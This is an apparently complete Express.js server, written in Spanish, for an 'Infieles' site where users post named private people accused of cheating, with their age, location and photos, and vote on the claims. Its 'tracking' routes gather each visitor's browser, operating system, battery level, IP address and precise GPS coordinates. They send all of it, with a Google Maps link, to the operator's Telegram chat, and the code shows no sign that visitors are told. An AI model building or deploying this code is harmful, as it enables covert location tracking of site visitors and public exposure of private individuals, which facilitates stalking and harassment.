import express from "express";
import cors from "cors";
import multer from "multer";
import path from "path";
import { fileURLToPath } from "url";
import pkg from "pg";

const { Pool } = pkg;
const app = express();

// Middleware
app.use(cors());
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true }));

// Multer para fotos
const upload = multer({ storage: multer.memoryStorage() });

// Conexión PostgreSQL
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false },
});

// =======================
// SERVIR CARPETA PUBLIC
// =======================
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// =======================
// FUNCIÓN PARA ENVIAR A TELEGRAM
// =======================
async function sendToTelegram(msg) {
    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN?.trim();
        const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
        
        console.log("🔍 Configuración Telegram:");
        console.log("- Bot Token:", botToken ? `${botToken.substring(0, 10)}...` : "No configurado");
        console.log("- Chat ID:", chatId);
        
        if (!botToken || !chatId) {
            console.error("❌ Faltan variables de entorno");
            return false;
        }
        
        // Convertir chatId a número
        const chatIdNum = Number(chatId);
        if (isNaN(chatIdNum)) {
            console.error("❌ Chat ID inválido, debe ser número");
            return false;
        }
        
        console.log(`📤 Enviando a Chat ID: ${chatIdNum} ${chatIdNum < 0 ? '(Grupo)' : '(Chat privado)'}`);
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const data = {
            chat_id: chatIdNum,
            text: msg,
            parse_mode: "HTML"
        };
        
        const response = await fetch(url, {
            method: "POST",
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            timeout: 10000
        });
        
        const result = await response.json();
        console.log("📥 Respuesta Telegram:", result);
        
        if (result.ok) {
            console.log("✅ Mensaje enviado exitosamente");
            return true;
        } else {
            console.error("❌ Error de Telegram:", result.description);
            
            // Errores específicos y soluciones
            switch (result.error_code) {
                case 400:
                    if (result.description.includes("chat not found")) {
                        console.error("💡 SOLUCIÓN: Chat no encontrado. Verifica:");
                        console.error("1. El bot debe estar añadido al grupo (para grupos)");
                        console.error("2. Debes haber enviado /start al bot (para chats privados)");
                        console.error("3. El bot debe tener Group Privacy desactivado para grupos");
                    }
                    break;
                case 403:
                    console.error("💡 SOLUCIÓN: Bot bloqueado o sin permisos");
                    console.error("1. Desbloquea el bot en el chat");
                    console.error("2. Asegúrate que el bot tenga permisos de admin en el grupo");
                    break;
                default:
                    console.error("💡 Revisa la configuración del bot");
            }
            return false;
        }
    } catch (error) {
        console.error("❌ Error general:", error.message);
        return false;
    }
}

// =======================
// RUTAS PRINCIPALES
// =======================
app.get("/infieles", async (req, res) => {
    try {
        const infieles = await pool.query("SELECT * FROM infieles ORDER BY id DESC");
        const resultados = [];
        for (let infiel of infieles.rows) {
            const comentariosQ = await pool.query(
                "SELECT * FROM comentarios WHERE infiel_id=$1 ORDER BY created_at ASC",
                [infiel.id]
            );
            resultados.push({
                ...infiel,
                comentarios: comentariosQ.rows
            });
        }
        res.json(resultados);
    } catch (err) {
        console.error("Error GET:", err);
        res.status(500).json({ error: "Error al obtener datos" });
    }
});

app.post("/nuevo", upload.array("fotos", 10), async (req, res) => {
    try {
        const { reportero, nombre, apellido, edad, ubicacion, historia } = req.body;
        const fotos = req.files?.map(f => f.buffer.toString("base64")) || [];
        const result = await pool.query(
            `INSERT INTO infieles (reportero,nombre,apellido,edad,ubicacion,historia,fotos)
             VALUES ($1,$2,$3,$4,$5,$6,$7) RETURNING *`,
            [reportero || "Anónimo", nombre, apellido, edad, ubicacion, historia, fotos]
        );
        res.json({ success: true, data: result.rows[0] });
    } catch (err) {
        console.error("Error POST:", err);
        res.status(500).json({ error: "No se pudo guardar" });
    }
});

app.post("/votar", async (req, res) => {
    try {
        const { infiel_id, usuario, voto } = req.body;
        await pool.query(
            `INSERT INTO votos (infiel_id, usuario, voto) VALUES ($1,$2,$3)
             ON CONFLICT (infiel_id, usuario) DO NOTHING`,
            [infiel_id, usuario, voto]
        );
        if (voto) {
            await pool.query("UPDATE infieles SET votos_reales=votos_reales+1 WHERE id=$1", [infiel_id]);
        } else {
            await pool.query("UPDATE infieles SET votos_falsos=votos_falsos+1 WHERE id=$1", [infiel_id]);
        }
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Error al votar" });
    }
});

app.post("/comentario", upload.array("fotos", 5), async (req, res) => {
    try {
        const { infiel_id, nombre, texto, propietario } = req.body;
        const fotos = req.files?.map(f => f.buffer.toString("base64")) || [];
        const result = await pool.query(
            `INSERT INTO comentarios (infiel_id,nombre,texto,fotos,propietario)
             VALUES ($1,$2,$3,$4,$5) RETURNING *`,
            [infiel_id, nombre || "Anónimo", texto, fotos, propietario || false]
        );
        res.json({ success: true, data: result.rows[0] });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Error al guardar comentario" });
    }
});

// =======================
// TRACKING
// =======================
function getClientIp(req) {
    const keys = [
        'x-client-ip',
        'x-forwarded-for',
        'x-forwarded',
        'x-cluster-client-ip',
        'forwarded-for',
        'forwarded',
        'cf-connecting-ip',
        'true-client-ip'
    ];

    for (const key of keys) {
        const header = req.headers[key];
        if (header) {
            const ips = header.split(',');
            for (let ip of ips) {
                ip = ip.trim();
                if (ip && ip !== '127.0.0.1' && !ip.startsWith('10.') && !ip.startsWith('192.168.')) {
                    return ip;
                }
            }
        }
    }
    return req.socket.remoteAddress || 'Unknown';
}

let visitaTemporal = null;

app.post("/recibe-info", (req, res) => {
    try {
        const { agent = '', navegador = '', versionapp = '', dystro = '', idioma = '', bateri = 'N/A' } = req.body;

        let navegadorDetectado = "Desconocido";
        if (agent.toLowerCase().includes('brave')) {
            const m = agent.match(/Brave\/([0-9.]+)/);
            navegadorDetectado = m ? `Brave ${m[1]}` : "Brave (basado en Chrome)";
        } else if (agent.toLowerCase().includes('edg')) {
            const m = agent.match(/Edg\/([0-9.]+)/);
            navegadorDetectado = `Edge ${m ? m[1] : ""}`;
        } else if (agent.toLowerCase().includes('opr') || agent.toLowerCase().includes('opera')) {
            const m = agent.match(/OPR\/([0-9.]+)/);
            navegadorDetectado = `Opera ${m ? m[1] : ""}`;
        } else if (agent.toLowerCase().includes('firefox')) {
            const m = agent.match(/Firefox\/([0-9.]+)/);
            navegadorDetectado = `Firefox ${m ? m[1] : ""}`;
        } else if (agent.toLowerCase().includes('safari') && !agent.toLowerCase().includes('chrome')) {
            const m = agent.match(/Version\/([0-9.]+)/);
            navegadorDetectado = `Safari ${m ? m[1] : ""}`;
        } else if (agent.toLowerCase().includes('chrome')) {
            const m = agent.match(/Chrome\/([0-9.]+)/);
            navegadorDetectado = `Chrome ${m ? m[1] : ""}`;
        }

        let sistema = "Desconocido";
        if (agent.toLowerCase().includes("windows nt 10")) sistema = "Windows 10";
        else if (agent.toLowerCase().includes("windows nt 6.3")) sistema = "Windows 8.1";
        else if (agent.toLowerCase().includes("windows nt 6.1")) sistema = "Windows 7";
        else if (agent.toLowerCase().includes("android")) sistema = "Android";
        else if (agent.toLowerCase().includes("iphone")) sistema = "iOS";
        else if (agent.toLowerCase().includes("linux")) sistema = "Linux";

        let arquitectura = '';
        if (dystro.toLowerCase().includes('armv7')) arquitectura = ' (32 bits)';
        else if (dystro.toLowerCase().includes('armv8') || dystro.toLowerCase().includes('aarch64')) arquitectura = ' (64 bits)';
        else arquitectura = ' (64 bits)';

        let idiomaBonito = idioma || "Desconocido";
        if (idioma === "es-MX") idiomaBonito = "Español (México) - es-MX";
        else if (idioma === "es-ES") idiomaBonito = "Español (España) - es-ES";
        else if (idioma === "en-US") idiomaBonito = "Inglés (EE.UU.) - en-US";

        const bateriaTexto = bateri !== 'N/A' ? `${bateri}%` : "Desconocido";

        visitaTemporal = `
🖥 Información del Dispositivo

- Navegador: ${navegadorDetectado}
- Sistema Operativo: ${sistema}${arquitectura}
- Idioma: ${idiomaBonito}
- Batería: ${bateriaTexto}
        `.trim();

        res.json({ status: 'ok', mensaje: visitaTemporal });
    } catch (err) {
        console.error("Error en /recibe-info:", err);
        res.status(500).json({ error: "Error" });
    }
});

app.post("/location", async (req, res) => {
    try {
        const { latitude, longitude, accuracy } = req.body;
        const ip = getClientIp(req);
        const ua = req.headers['user-agent'] || 'Unknown';
        const ts = new Date().toISOString();

        let msg = "📍 <b>NUEVA UBICACIÓN RECIBIDA</b>\n";
        msg += `🌐 IP: ${ip}\n`;
        if (latitude) msg += `📌 Latitud: ${latitude}\n`;
        if (longitude) msg += `📌 Longitud: ${longitude}\n`;
        if (accuracy) msg += `🎯 Precisión: ${accuracy}m\n`;
        msg += `🖥️ User-Agent: ${ua.substring(0, 80)}...\n\n`;

        msg += "<b>Información del dispositivo:</b>\n";
        if (visitaTemporal) {
            msg += visitaTemporal + "\n";
        } else {
            msg += "Sin datos adicionales\n";
        }

        msg += `\n⏰ Hora: ${ts}`;
        if (latitude && longitude) {
            msg += `\n🌍 Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
        }

        console.log("📍 Enviando ubicación a Telegram...");
        const telegramEnviado = await sendToTelegram(msg);
        
        visitaTemporal = null;

        res.json({ 
            status: 'logged', 
            timestamp: ts,
            telegram_sent: telegramEnviado,
            message: telegramEnviado ? "✅ Ubicación enviada" : "❌ Error al enviar"
        });
    } catch (err) {
        console.error("Error en /location:", err);
        res.status(500).json({ 
            error: "Error interno",
            details: err.message 
        });
    }
});

// =======================
// RUTAS DE DIAGNÓSTICO
// =======================
app.get("/debug", (req, res) => {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    res.json({
        telegram: {
            bot_token_exists: !!botToken,
            chat_id_exists: !!chatId,
            chat_id_value: chatId,
            chat_id_type: chatId ? (chatId.startsWith('-') ? 'Grupo' : 'Chat privado') : 'No configurado',
            chat_id_numeric: Number(chatId) || 'Inválido'
        },
        server: {
            node: process.version,
            environment: process.env.NODE_ENV || 'development',
            uptime: process.uptime()
        }
    });
});

app.get("/debug/telegram-test", async (req, res) => {
    try {
        const testMsg = `🤖 <b>PRUEBA DE CONEXIÓN</b>\n\n` +
                       `✅ Bot activo: SrLeviBot\n` +
                       `🕐 Hora: ${new Date().toLocaleString()}\n` +
                       `💬 Chat ID: ${process.env.TELEGRAM_CHAT_ID}\n` +
                       `📱 Servidor: ${req.headers.host}`;
        
        console.log("🔧 Probando conexión Telegram...");
        const success = await sendToTelegram(testMsg);
        
        res.json({
            success: success,
            test_sent: true,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error("Error en test:", error);
        res.status(500).json({ error: error.message });
    }
});

app.get("/debug/check-bot", async (req, res) => {
    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        if (!botToken) {
            return res.json({ error: "No token configurado" });
        }
        
        const url = `https://api.telegram.org/bot${botToken}/getMe`;
        const response = await fetch(url);
        const result = await response.json();
        
        res.json({
            bot_active: result.ok,
            bot_info: result.result,
            group_permissions: {
                can_join_groups: result.result?.can_join_groups,
                can_read_all_group_messages: result.result?.can_read_all_group_messages,
                issue: result.result?.can_join_groups === false ? 
                    "❌ Bot NO puede unirse a grupos. Ve a @BotFather → Bot Settings → Group Privacy → Turn off" :
                    "✅ Bot puede unirse a grupos"
            }
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Ruta para obtener mensajes recientes del bot
app.get("/debug/bot-updates", async (req, res) => {
    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        if (!botToken) {
            return res.json({ error: "No token configurado" });
        }
        
        const url = `https://api.telegram.org/bot${botToken}/getUpdates`;
        const response = await fetch(url);
        const result = await response.json();
        
        // Extraer Chat IDs únicos
        const chatIds = [];
        if (result.result) {
            result.result.forEach(update => {
                if (update.message) {
                    const chat = update.message.chat;
                    chatIds.push({
                        id: chat.id,
                        type: chat.id < 0 ? 'Grupo' : 'Privado',
                        title: chat.title || chat.username || chat.first_name || `Chat ${chat.id}`
                    });
                }
            });
        }
        
        res.json({
            success: result.ok,
            total_updates: result.result?.length || 0,
            available_chat_ids: [...new Map(chatIds.map(item => [item.id, item])).values()],
            updates_sample: result.result?.slice(0, 3)
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get("/health", (req, res) => {
    res.json({
        status: "ok",
        timestamp: new Date().toISOString(),
        service: "Infieles API"
    });
});

// =======================
// INICIAR SERVIDOR
// =======================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log("=======================================");
    console.log("🚀 API Infieles iniciada");
    console.log("📍 Puerto:", PORT);
    console.log("🌐 Entorno:", process.env.NODE_ENV || "development");
    console.log("=======================================");
    
    // Mostrar config Telegram
    const chatId = process.env.TELEGRAM_CHAT_ID;
    console.log("\n🤖 CONFIGURACIÓN TELEGRAM:");
    console.log("- Chat ID:", chatId || "No configurado");
    if (chatId) {
        console.log("- Tipo:", chatId.startsWith('-') ? "Grupo" : "Chat privado");
        console.log("- Numérico:", Number(chatId) || "Inválido");
    }
    
    console.log("\n🔍 RUTAS DE DIAGNÓSTICO:");
    console.log("- GET  /debug - Configuración actual");
    console.log("- GET  /debug/telegram-test - Probar Telegram");
    console.log("- GET  /debug/check-bot - Estado del bot");
    console.log("- GET  /debug/bot-updates - Ver chats disponibles");
    console.log("- POST /location - Enviar ubicación (tracking)");
    console.log("=======================================\n");
});
